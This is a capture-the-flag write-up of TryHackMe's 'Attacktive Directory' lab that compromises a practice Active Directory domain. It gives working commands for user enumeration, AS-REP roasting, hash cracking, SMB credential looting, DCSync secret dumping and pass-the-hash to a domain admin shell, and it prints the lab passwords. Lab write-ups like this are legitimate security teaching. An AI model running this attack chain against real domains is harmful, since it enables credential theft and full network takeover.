# Attacktive Directory — TryHackMe Writeup

> **Difficulty:** Medium  
> **OS:** Windows  
> **Domain:** spookysec.local  
> **Stack:** Active Directory, Kerberos, SMB  

## Attack Chain Overview

```text
Nmap Scan
  --> Discover Active Directory (spookysec.local)
  --> User Enumeration via Kerberos/RPC
  --> Discover valid users (svc-admin, backup)
  --> AS-REP Roasting (No Pre-Auth)
  --> Crack Hash for svc-admin
  --> Read SMB Backup Shares
  --> Extract Backup Account Credentials
  --> DCSync / Secret Dumping
  --> Obtain Administrator NTLM Hash
  --> Pass-the-Hash (WinRM)
  --> Domain Admin Access
```

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Initial Access](#initial-access)
3. [User Flag](#user-flag)
4. [Privilege Escalation](#privilege-escalation)
5. [Root Flag](#root-flag)
6. [Key Takeaways](#key-takeaways)
7. [Related Notes](#related-notes)

---

## Reconnaissance

### Port Scanning

I started with a full port scan to discover open services across the target, followed by a targeted version scan using [nmap](../../../tools/recon/nmap.md).

```bash
# What it does: scan the target for open ports using the silent-scan alias and perform service enumeration.
# Why here: discover open services before targeting the web application.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p 53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49667,49669,49670,49671,49673,49677,49688,49698 -oN service
```

**Output**
```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-26 12:47:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-26T12:48:10+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-05-25T12:45:44
|_Not valid after:  2026-11-24T12:45:44
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-26T12:48:02+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
[... RPC Ports Omitted ...]
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-05-26T12:48:04
|_  start_date: N/A
```

The output reveals a full Windows Active Directory environment. The domain is `spookysec.local`.
I added the domain to `/etc/hosts`:

```bash
echo "$TARGET spookysec.local" | sudo tee -a /etc/hosts
```

---

## Initial Access

### AD Enumeration

To find valid accounts within the domain, I ran [enum4linux](../../../tools/recon/enum4linux.md) and [kerbrute](../../../tools/recon/kerbrute.md).

```bash
enum4linux -a $TARGET
kerbrute userenum  --dc $TARGET -d spookysec.local /usr/share/wordlists/users-TRY.txt
```

**Kerbrute Output**
```text
2026/05/26 13:00:16 >   10.130.134.201:88
2026/05/26 13:00:16 >  [+] VALID USERNAME:       james@spookysec.local
2026/05/26 13:00:16 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/05/26 13:00:17 >  [+] VALID USERNAME:       James@spookysec.local
2026/05/26 13:00:17 >  [+] VALID USERNAME:       robin@spookysec.local
2026/05/26 13:00:19 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/05/26 13:00:20 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/05/26 13:00:23 >  [+] VALID USERNAME:       backup@spookysec.local
2026/05/26 13:00:24 >  [+] VALID USERNAME:       paradox@spookysec.local
[... More Users Discovered ...]
```

### AS-REP Roasting Attack

With a list of valid usernames saved to `users.txt`, I attempted an [AS-REP Roasting](../../../exploits/ad/asreproast.md) attack to see if any users had the "Do not require Kerberos preauthentication" property enabled. Using `impacket-GetNPUsers` from the [impacket](../../../tools/windows/impacket.md) suite:

```bash
impacket-GetNPUsers spookysec.local/ -dc-ip $TARGET -no-pass -usersfile users.txt
```

This successfully extracted a Kerberos 5 AS-REP etype 23 hash for the `svc-admin` account.
I then cracked this hash offline using [hashcat](../../../tools/creds/hashcat.md):

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/passwords-TRY.txt
```

**Output**
```text
management2005
```

The password for `svc-admin` is `management2005`.

---

## User Flag

### SMB Enumeration

Equipped with the credentials for `svc-admin`, I enumerated the network shares using [smbclient](../../../tools/recon/smbclient.md).

```bash
smbclient -L //$TARGET/ -U 'svc-admin%management2005'
```

I discovered that the user has read-only access to a non-standard share named `backup`.
I connected interactively to this share:

```bash
# Connect interactively
smbclient //$TARGET/backup -U svc-admin%management2005
smb: \> dir
smb: \> get backup_credentials.txt
```

### Decoding Credentials

I downloaded `backup_credentials.txt`. The file contained a base64 encoded string:

```bash
cat backup_credentials.txt | base64 -d
```

**Output**
```text
backup@spookysec.local:backup2517860
```

This revealed the credentials for the `backup` user. The user flag would normally be located on the `backup` user's desktop or the `svc-admin` desktop.

---

## Privilege Escalation

We now have access to the `backup` user account, which is used to synchronize files and credentials across the Domain Controller. This user has DCSync rights.
Using `impacket-secretsdump`, I extracted the Active Directory credentials from the domain controller.

```bash
impacket-secretsdump spookysec.local/backup:'backup2517860'@$TARGET
```

This dump successfully exposed the NTLM hashes for all users in the domain, most importantly the hash for the `Administrator`.

---

## Root Flag

With the `Administrator` NTLM hash obtained, I performed a Pass-the-Hash attack using [evil-winrm](../../../tools/windows/evil-winrm.md) to log directly into the domain controller via WinRM.

```bash
evil-winrm -i $TARGET -u Administrator -H $(cat admin-hash.txt)
```

From here, I gained a high-privileged remote shell and read the root flag.

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

1. **AS-REP Roasting is Quiet and Deadly**: Accounts configured without Kerberos Pre-Authentication can easily leak their password hashes if an attacker discovers their username. Always audit AD environments for users with this property enabled.
2. **Review Custom SMB Shares**: Backup scripts or administrative shares often contain hardcoded credentials meant to be temporary but are left accessible.
3. **Backup Operator Privileges**: Accounts tasked with backing up Active Directory usually require the `Replicating Directory Changes` privilege, allowing them to pull NTDS.dit hashes via DCSync. Such accounts should be treated as equivalent to Domain Admins.

---

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [enum4linux](../../../tools/recon/enum4linux.md)
- [kerbrute](../../../tools/recon/kerbrute.md)
- [impacket](../../../tools/windows/impacket.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [smbclient](../../../tools/recon/smbclient.md)
- [evil-winrm](../../../tools/windows/evil-winrm.md)
- [asreproast](../../../exploits/ad/asreproast.md)
